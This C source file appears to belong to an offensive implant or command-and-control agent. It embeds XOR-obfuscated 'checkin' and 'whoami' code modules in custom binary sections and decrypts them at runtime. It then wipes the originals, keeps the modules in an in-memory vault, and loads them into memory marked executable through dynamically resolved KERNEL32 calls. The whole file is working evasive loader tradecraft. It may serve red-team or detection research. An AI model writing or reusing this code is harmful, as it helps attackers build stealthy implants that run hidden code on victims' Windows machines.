#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));
char __WHOAMI_PICO__[0] __attribute__((section("pico_whoami")));

WIN32FUNCS resolve_pico_functions() {
	WIN32FUNCS funcs;
	
	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
	
	return funcs;
}

char * find_checkin_pico() {
    return (char *)&__CHECKIN_PICO__;
}

char * find_whoami_pico() {
    return (char *)&__WHOAMI_PICO__;
}

char *deobfuscate_pico(_EMBEDDED_PICO *pico, char *key, int keylen) {
	char *output = KERNEL32$VirtualAlloc(0, pico->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	xorify(output, pico->value, pico->length, key, keylen);
	return output;
}

BuiltinPicos load_builtin_picos(DataVault *vault, char *key) {
	BuiltinPicos picos = { 0 };

	// Load default names for the built-in PICOs.
	picos.checkin = "_builtin_checkin";
	picos.whoami = "_builtin_whoami";
	
	// Get embedded and obfuscated PICO data.
	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
	
	// Deobfuscate PICOs.
	char *checkin_buf = deobfuscate_pico(checkin, key, XORKEY_LEN);
	char *whoami_buf = deobfuscate_pico(whoami, key, XORKEY_LEN);
	
	// Copy deobfuscated PICOs into the in-memory vault.
	add_to_vault(vault, picos.checkin, checkin_buf, checkin->length);
	add_to_vault(vault, picos.whoami, whoami_buf, whoami->length);
	
	// Free temporary buffers.
	KERNEL32$VirtualFree(checkin_buf, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(whoami_buf, 0, MEM_RELEASE);
	
	// Zero out the obfuscated PICO data.
	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
	
	return picos;
}

BOOL resolve_loaded_pico(DataVault *vault, WIN32FUNCS *funcs, ResolvedPico *pico, char *key) {
	DataBuffer databuf = { 0 };
	BOOL result = retrieve_from_vault(vault, &databuf, key);
	if (result == FALSE) { return FALSE; }
	
	char *buf = resolve_databuffer(vault, &databuf);
	
	// Note that buf is a pointer into the vault, which might become invalid if the vault is extended (reallocated).
	// It's the caller's responsibility to resolve the pico, invoke it, then free it BEFORE calling add_to_vault() again.
	
	pico->codelen = PicoCodeSize(buf);
	pico->code = KERNEL32$VirtualAlloc(NULL, pico->codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
	pico->datalen = PicoDataSize(buf);
	pico->data = KERNEL32$VirtualAlloc(NULL, pico->datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
	
	PicoLoad((IMPORTFUNCS *) funcs, buf, pico->code, pico->data);
	
	DWORD oldProtect;
	KERNEL32$VirtualProtect(pico->code, pico->codelen, PAGE_EXECUTE_READ, &oldProtect); 
	
	pico->entrypoint = PicoEntryPoint(buf, pico->code);
	
	return TRUE;
}

void free_resolved_pico(ResolvedPico *pico) {
	KERNEL32$VirtualFree(pico->code, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(pico->data, 0, MEM_RELEASE);
}
